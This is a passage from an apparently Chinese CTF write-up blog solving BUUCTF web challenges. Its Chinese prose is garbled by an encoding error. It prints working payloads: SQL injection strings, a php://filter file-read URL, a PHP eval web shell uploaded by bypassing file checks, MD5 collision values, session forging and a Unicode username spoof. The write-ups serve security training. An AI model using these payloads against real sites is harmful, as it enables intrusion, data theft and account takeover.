</span></span><span class="line"><span class="cl"><span class="n">prepare</span><span class="err">‚Ä¶</span><span class="n">from</span><span class="err">‚Ä¶ÊòØÈ¢ÑÂ§ÑÁêÜËØ≠Âè•Ôºå‰ºöËøõË°åÁºñÁ†ÅËΩ¨Êç¢„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="n">executeÁî®Êù•ÊâßË°åÁî±SQLPrepareÂàõÂª∫ÁöÑSQLËØ≠Âè•</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ëß£Ê≥ï‰∏â</p>
<p>Áî®handlerÂëΩ‰ª§Êü•ÁúãÔºå</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;; handler 1919810931114514 open as a;handler a read next;#
</span></span><span class="line"><span class="cl">handler‰ª£ÊõøselectÔºå‰ª•‰∏ÄË°å‰∏ÄË°åÊòæÁ§∫ÂÜÖÂÆπ
</span></span><span class="line"><span class="cl">openÊâìÂºÄË°®
</span></span><span class="line"><span class="cl">asÊõ¥ÊîπË°®ÁöÑÂà´Âêç‰∏∫a
</span></span><span class="line"><span class="cl">read nextËØªÂèñÊï∞ÊçÆÊñá‰ª∂ÂÜÖÁöÑÊï∞ÊçÆÊ¨°Êï∞
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="10ÊûÅÂÆ¢Â§ßÊåëÊàò-2019secret-file">10„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Secret File
</h2><p>Êü•ÁúãÊ∫êÁ†ÅÔºåÂèëÁé∞ÂÖ∂‰ªñphpÊñá‰ª∂</p>
<p>end.phpÂâçÈù¢ÁöÑÊñá‰ª∂ÊäìÂåÖ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110202811560.png"
	width="1334"
	height="557"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110202811560_hu5151190173147087930.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110202811560_hu4440660311575203877.png 1024w"
	loading="lazy"
	
		alt="image-20250110202811560"
	
	
		class="gallery-image" 
		data-flex-grow="239"
		data-flex-basis="574px"
	
></p>
<p>ÂèëÁé∞secr3t.php</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110202903072.png"
	width="1310"
	height="519"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110202903072_hu1330968836301971618.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110202903072_hu17112848750795538117.png 1024w"
	loading="lazy"
	
		alt="image-20250110202903072"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="605px"
	
></p>
<p>ËÆøÈóÆflag.php</p>
<p>Áî®ÂâçÈù¢IncludeÁöÑÊñπÊ≥ïphp‰º™ÂçèËÆÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110203206112.png"
	width="1022"
	height="900"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110203206112_hu7793180927182112151.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110203206112_hu4161421072210040081.png 1024w"
	loading="lazy"
	
		alt="image-20250110203206112"
	
	
		class="gallery-image" 
		data-flex-grow="113"
		data-flex-basis="272px"
	
></p>
<h2 id="11ÊûÅÂÆ¢Â§ßÊåëÊàò-2019http">11„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Http
</h2><p>Êü•ÁúãÊ∫êÁ†ÅÂèëÁé∞Secret.php</p>
<p>It doesn‚Äôt come from ‚Äòhttps://www.Sycsecret.com‚ÄôÔºå‰πüÂ∞±ÊòØËØ¥Ëøô‰∏™È°µÈù¢ÂæóÊù•Ëá™https://www.Sycsecret.comÔºåÊ∑ªÂä†refererÂç≥ÂèØ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210415792.png"
	width="1569"
	height="772"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210415792_hu15219035731630051655.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110210415792_hu12807455415671497828.png 1024w"
	loading="lazy"
	
		alt="image-20250110210415792"
	
	
		class="gallery-image" 
		data-flex-grow="203"
		data-flex-basis="487px"
	
></p>
<p>Ê∑ªÂä†User-Agent:Syclover</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210613494.png"
	width="1508"
	height="622"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210613494_hu14163787657773204977.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110210613494_hu10732868678703024959.png 1024w"
	loading="lazy"
	
		alt="image-20250110210613494"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="581px"
	
></p>
<p>Ê∑ªÂä†X-Forwarded-For:127.0.0.1</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210725577.png"
	width="1559"
	height="739"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250110210725577_hu6624016257549609572.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250110210725577_hu13133051348444938672.png 1024w"
	loading="lazy"
	
		alt="image-20250110210725577"
	
	
		class="gallery-image" 
		data-flex-grow="210"
		data-flex-basis="506px"
	
></p>
<h2 id="12ÊûÅÂÆ¢Â§ßÊåëÊàò-2019upload">12„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Upload
</h2><p>Ë¶ÅÊ±Ç‰∏ä‰º†ÂõæÁâáÔºåÊàë‰ª¨ÊääÊñá‰ª∂Á±ªÂûãÊîπ‰∏∫image/jpeg</p>
<p>‰∏ãÈù¢Ë°•‰∏äGIF89a</p>
<p>‰∏ä‰º†ÁöÑÂÜÖÂÆπË¢´ËØÜÂà´Âá∫&lt;?Ë¶ÅÊîπ‰∏∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂ∞ùËØïÁ≠â‰ª∑ÂêéÁºÄÂêçÔºåÊúÄÂêéphtml‰∏ä‰º†ÊàêÂäüÔºåËøõuploadÁõÆÂΩïÔºåËöÅÂâëËøûÊé•</p>
<h2 id="13ÊûÅÂÆ¢Â§ßÊåëÊàò-2019knife">13„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Knife
</h2><p>ËöÅÂâëËøûÊé•</p>
<h2 id="14actf2020-Êñ∞ÁîüËµõupload">14„ÄÅ[ACTF2020 Êñ∞ÁîüËµõ]Upload
</h2><p>ÂâçÁ´ØÈ™åËØÅÊääonsubmitÂà†ÊéâÔºåÂêéÈù¢Ë∑ü12È¢ò‰∏ÄÊ†∑</p>
<h2 id="15ÊûÅÂÆ¢Â§ßÊåëÊàò-2019babysql">15„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]BabySQL
</h2><p>ÂçïÂºïÂè∑Èó≠ÂêàÔºåÁÑ∂ÂêéÂæàÂ§öË¢´ËøáÊª§‰∫ÜÔºåÈÉΩÁî®ÂèåÂÜôÁªïËøá,check.phpÂêéÊãºÊé•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username=1%27%20ununionion%20seselectlect%201,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema=%27ctf%27%23&amp;password=1
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="16ÊûÅÂÆ¢Â§ßÊåëÊàò-2019php">16„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]PHP
</h2><p>www.zip‰∏ãËΩΩÊ∫êÁ†Å</p>
<p>ÂèçÂ∫èÂàóÂåñ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Name</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$password</span> <span class="o">=</span>  <span class="s1">&#39;100&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$select</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Name</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$select</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊääÁªìÊûúÁöÑÂ•áÊÄ™Á¨¶Âè∑Áî®%00‰ª£ÊõøÔºå%00ÊòØÁ©∫Ê†ºÁöÑurlÁºñÁ†Å</p>
<h2 id="17actf2020-Êñ∞ÁîüËµõbackupfile">17„ÄÅ[ACTF2020 Êñ∞ÁîüËµõ]BackupFile
</h2><p>phpÂº±ÊØîËæÉkey=123</p>
<h2 id="18roarctf-2019easy-calc">18„ÄÅ[RoarCTF 2019]Easy Calc
</h2><p>Ê∫êÁ†ÅÈáåÈù¢Êü•Áúãcalc.php</p>
<p>num‰º†ÂèÇÂè™ËÉΩ‰º†Êï∞Â≠óÔºå‰ΩÜÊòØÊàë‰ª¨Áî®+numÊàñËÄÖÁ©∫Ê†ºnumÂ∞±ËÉΩ‰º†Â≠óÁ¨¶ÔºåÂõ†‰∏∫Áé∞Âú®ÁöÑÂèòÈáèÂè´‚Äú num‚ÄùÔºåËÄå‰∏çÊòØ‚Äúnum‚Äù„ÄÇ‰ΩÜphpÂú®Ëß£ÊûêÁöÑÊó∂ÂÄôÔºå‰ºöÂÖàÊääÁ©∫Ê†ºÁªôÂéªÊéâÔºåËøôÊ†∑‰ª£Á†ÅËøòËÉΩÊ≠£Â∏∏ËøêË°åÔºåËøò‰∏ä‰º†‰∫ÜÈùûÊ≥ïÂ≠óÁ¨¶„ÄÇ</p>
<p>ËøáÊª§/ÔºåÊàë‰ª¨Áî®chr(47)ÁªïËøáÔºåphpinfo();ÁúãÂà∞Á¶ÅÁî®system,Áî®var_dump(scandir(/))</p>
<p>ÁúãÂà∞flagÊòØf1agg</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">+</span><span class="n">num</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="n">var_dump</span><span class="p">(</span><span class="n">file_get_contents</span><span class="p">(</span><span class="n">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">.</span><span class="n">f1agg</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="19ÊûÅÂÆ¢Â§ßÊåëÊàò-2019buyflag">19„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]BuyFlag
</h2><p>ÂØÜÁ†ÅÂº±ÊØîËæÉÔºåmoneyÁî®1e9ÊàñËÄÖmoney[]=1Êï∞ÁªÑÁªïËøáÔºåcookieÈáåÈù¢userÊîπ‰∏∫1</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250206172645773.png"
	width="1825"
	height="598"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250206172645773_hu2127346124669215180.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250206172645773_hu4321684527321767191.png 1024w"
	loading="lazy"
	
		alt="image-20250206172645773"
	
	
		class="gallery-image" 
		data-flex-grow="305"
		data-flex-basis="732px"
	
></p>
<h2 id="20bjdctf2020easy-md5">20„ÄÅBJDCTF2020]Easy MD5
</h2><p>ÊâìÂºÄÁΩëÁªúÔºåÁúãÂà∞hint</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207104904850.png"
	width="1918"
	height="362"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207104904850_hu16747176574055752088.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250207104904850_hu16931399427505801973.png 1024w"
	loading="lazy"
	
		alt="image-20250207104904850"
	
	
		class="gallery-image" 
		data-flex-grow="529"
		data-flex-basis="1271px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from &#39;admin&#39; where password=md5($pass,true)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë¶ÅÂú®passwordËøôÈáåÊãºÊé•‰∏Ä‰∏™or 1Â∞±ÂèØ‰ª•‰ΩøÁªìÊûú‰∏∫Áúü</p>
<p>md5Âä†ÂØÜÂêéÂæóÂà∞hashÂÄºÔºåsqlËØ≠Âè•‰ºöÊäähexÂÄºËΩ¨‰∏∫ascii</p>
<p>ffifdyop Ëøô‰∏™Â≠óÁ¨¶‰∏≤Ë¢´ md5 ÂìàÂ∏å‰∫Ü‰πãÂêé‰ºöÂèòÊàê <code>276f722736c95d99e921722cf9ed621c</code>ÔºåËøô‰∏™Â≠óÁ¨¶‰∏≤ÂâçÂá†‰ΩçÂàöÂ•ΩÊòØ<code> ' or '6</code></p>
<p>ÊãºÊé•ÂêéÁªìÊûú‰πü‰∏∫Áúü</p>
<p>ËÆ°ÁÆóËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;;)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl"> <span class="k">for</span> <span class="p">(</span><span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$c</span> <span class="o">&lt;</span> <span class="mi">1000000</span><span class="p">;</span> <span class="nv">$c</span><span class="o">++</span><span class="p">,</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span> <span class="k">true</span><span class="p">),</span> <span class="s1">&#39;\&#39;or\&#39;&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">md5(</span><span class="si">$i</span><span class="s2">) = &#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="k">echo</span> <span class="s2">&#34;.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="md5ÂáΩÊï∞">md5ÂáΩÊï∞
</h3><p>md5 ÂáΩÊï∞ÈÄöÂ∏∏Áî®‰∫éËÆ°ÁÆóËæìÂÖ•Â≠óÁ¨¶‰∏≤ÁöÑ MD5 ÂìàÂ∏åÂÄº„ÄÇmd5(string, raw) ËøôÁßçÂΩ¢ÂºèÁöÑÂáΩÊï∞Ë∞ÉÁî®‰∏≠Ôºåstring ÊòØÈúÄË¶ÅËøõË°åÂìàÂ∏åËÆ°ÁÆóÁöÑËæìÂÖ•Â≠óÁ¨¶‰∏≤ÔºåËÄå raw ÊòØ‰∏Ä‰∏™Â∏ÉÂ∞îÁ±ªÂûãÁöÑÂèÇÊï∞ÔºåÁî®‰∫éÊåáÂÆöËøîÂõûÁöÑÂìàÂ∏åÂÄºÁöÑÊ†ºÂºè„ÄÇ</p>
<p>stringÔºöËøôÊòØÂøÖÈúÄÁöÑÂèÇÊï∞Ôºå‰ª£Ë°®Ë¶ÅËøõË°å MD5 ÂìàÂ∏åËÆ°ÁÆóÁöÑÂéüÂßãÂ≠óÁ¨¶‰∏≤Êï∞ÊçÆ„ÄÇÂèØ‰ª•ÊòØ‰ªªÊÑèÈïøÂ∫¶ÁöÑÊñáÊú¨‰ø°ÊÅØÔºå‰æãÂ¶ÇÁî®Êà∑ÂØÜÁ†Å„ÄÅÊñá‰ª∂ÂÜÖÂÆπÁ≠â„ÄÇ
rawÔºöËøôÊòØ‰∏Ä‰∏™ÂèØÈÄâÂèÇÊï∞Ôºå‰∏çÂêåÁºñÁ®ãËØ≠Ë®ÄÂØπËØ•ÂèÇÊï∞ÁöÑÂ§ÑÁêÜÂíåÂê´‰πâÂèØËÉΩÊúâÊâÄ‰∏çÂêåÔºå‰ΩÜ‰∏ÄËà¨Êù•ËØ¥Ôºö
ÂΩì raw ‰∏∫ true ÊàñËÄÖÁ±ª‰ººË°®Á§∫ÁúüÁöÑÂÄºÊó∂ÔºåÂáΩÊï∞‰ºöËøîÂõûÂéüÂßãÁöÑ 128 ‰ΩçÔºà16 Â≠óËäÇÔºâ‰∫åËøõÂà∂Ê†ºÂºèÁöÑÂìàÂ∏åÂÄº„ÄÇ
ÂΩì raw ‰∏∫ false ÊàñËÄÖÁ±ª‰ººË°®Á§∫ÂÅáÁöÑÂÄºÊó∂ÔºåÂáΩÊï∞‰ºöËøîÂõû‰ª• 32 ‰ΩçÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤ÂΩ¢ÂºèË°®Á§∫ÁöÑÂìàÂ∏åÂÄº„ÄÇ
Êé•‰∏ãÊù•ÊòØmd5Âº±ÊØîËæÉ,ÂºÄÂ§¥‰∏∫0eÂ∞±Ë°å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MAUXXQC 0e478478466848439040434801845361
</span></span><span class="line"><span class="cl">IHKFRNS 0e256160682445802696926137988570
</span></span><span class="line"><span class="cl">GZECLQZ 0e537612333747236407713628225676
</span></span><span class="line"><span class="cl">GGHMVOE 0e362766013028313274586933780773
</span></span><span class="line"><span class="cl">GEGHBXL 0e248776895502908863709684713578
</span></span><span class="line"><span class="cl">EEIZDOI 0e782601363539291779881938479162
</span></span><span class="line"><span class="cl">DYAXWCA 0e424759758842488633464374063001
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÊòØmd5Âº∫ÊØîËæÉÔºåÊï∞ÁªÑÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">param1[]=1&amp;param2[]=2
</span></span><span class="line"><span class="cl">ÊàñËÄÖÁ°ÆÂÆûÊúâa!=b‰ΩÜÊòØMD5ÂÄºÁõ∏ÂêåÁöÑ
</span></span><span class="line"><span class="cl">param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
</span></span><span class="line"><span class="cl">ÊàñËÄÖ
</span></span><span class="line"><span class="cl">a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="21hctf-2018admin">21„ÄÅ[HCTF 2018]admin
</h2><p>Èöè‰æøÊ≥®ÂÜåË¥¶Âè∑Êúâ‰∏™‰øÆÊîπÂØÜÁ†ÅÁöÑÈÄâÈ°π</p>
<p>Êü•ÁúãÊ∫êÁ†Å</p>
<p>ËøôÈáåÊúâ‰∏Ä‰∏™ÈìæÊé•‰ΩÜÊòØÂ§±Êïà‰∫ÜÔºåÁΩë‰∏äÊâæÂà´‰∫∫ÁöÑwp,ÂæóÂà∞secret_key=ckj123ÔºåÈúÄË¶Å‰º™ÈÄ†session</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207114708477.png"
	width="1477"
	height="414"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207114708477_hu2983879188177521985.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250207114708477_hu12810230351352630441.png 1024w"
	loading="lazy"
	
		alt="image-20250207114708477"
	
	
		class="gallery-image" 
		data-flex-grow="356"
		data-flex-basis="856px"
	
></p>
<p>ÁÑ∂ÂêéÊîπsession,ÂæóÂà∞flag</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207114736442.png"
	width="1082"
	height="367"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207114736442_hu9379540159199588482.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250207114736442_hu451247868980856512.png 1024w"
	loading="lazy"
	
		alt="image-20250207114736442"
	
	
		class="gallery-image" 
		data-flex-grow="294"
		data-flex-basis="707px"
	
></p>
<p>unicodeÊ¨∫È™óÔºåÊ∫êÁ†ÅÈáåÈù¢ÊúâstrlowerÂáΩÊï∞ÔºåÊàë‰ª¨ÂàõÂª∫‰∏Ä‰∏™Â§ßÂÜôÁöÑADMINË¥¶Êà∑Ôºå‰ºöË¢´ÁºñËØëÊàêÂ∞èÂÜôÁöÑÔºåÁÑ∂Âêé‰øÆÊîπÂØÜÁ†ÅÂ∞±ËÉΩÁôªÂÖ•Ôºå‰ΩÜÈöèÂêéÂèëÁé∞Ê≥®ÂÜåÂíåÁôªÂΩïÈÉΩÁî®‰∫ÜËΩ¨Â∞èÂÜôÔºåÊ≥®ÂÜåADMINÁöÑËÆ°ÂàíÂ§±Ë¥•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">def strlower(username):
</span></span><span class="line"><span class="cl">    username = nodeprep.prepare(username)
</span></span><span class="line"><span class="cl">    return username
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÁöÑnodeprep.prepareÂ≠òÂú®ÊºèÊ¥û</p>
<p><code>·¥Ä ô·¥Ñ·¥Ö·¥áÍú∞…¢ ú…™·¥ä·¥ã ü·¥ç…¥·¥è·¥ò ÄÍú±·¥õ·¥ú·¥†·¥° è·¥¢</code>ËøôÁßçÁºñÁ†Å‰ºöÂÖàËΩ¨‰∏∫Â§ßÂÜôÁöÑÔºåÂÜçËΩ¨‰∏∫Â∞èÂÜôÔºåÂ∞±ËÉΩ‰º™ÈÄ†admin</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">·¥Ä -&gt; A -&gt; a
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Ê≥®ÂÜåÁî®Êà∑·¥Ädmin</li>
<li>ÁôªÂΩïÁî®Êà∑·¥ÄdminÔºåÂèòÊàêAdmin</li>
<li>‰øÆÊîπÂØÜÁ†ÅAdminÔºåÊõ¥Êîπ‰∫ÜadminÁöÑÂØÜÁ†Å</li>
</ul>
<h2 id="22mrctf2020‰Ω†‰º†‰Ω†Âë¢">22„ÄÅ[MRCTF2020]‰Ω†‰º†‰Ω†üêéÂë¢
</h2><p>‰º†.htaccessÊñá‰ª∂ÊääjpgËΩ¨‰∏∫phpÔºåÊäìÂåÖÊîπÊñá‰ª∂Ê†ºÂºèÔºåËøôÈáåjpg‰∏çË°åË¶ÅÁî®pngÔºå‰∏ä‰º†ËöÅÂâëËøûÊé•</p>
<h2 id="23zjctf-2019nizhuansiwei">23„ÄÅ[ZJCTF 2019]NiZhuanSiWei
</h2><p>textÁî®data‰º†ÂÄºÔºåÁÑ∂Âêéfile‰º†useless.phpÁúãphpÂÜÖÂÆπ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207135556890.png"
	width="1005"
	height="754"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250207135556890_hu14058552428265661589.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250207135556890_hu3027424829034215574.png 1024w"
	loading="lazy"
	
		alt="image-20250207135556890"
	
	
		class="gallery-image" 
		data-flex-grow="133"
		data-flex-basis="319px"
	
></p>
<p>ËøòÊúâ‰∏Ä‰∏™passwordË¶ÅÂèçÂ∫èÂàóÂåñ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
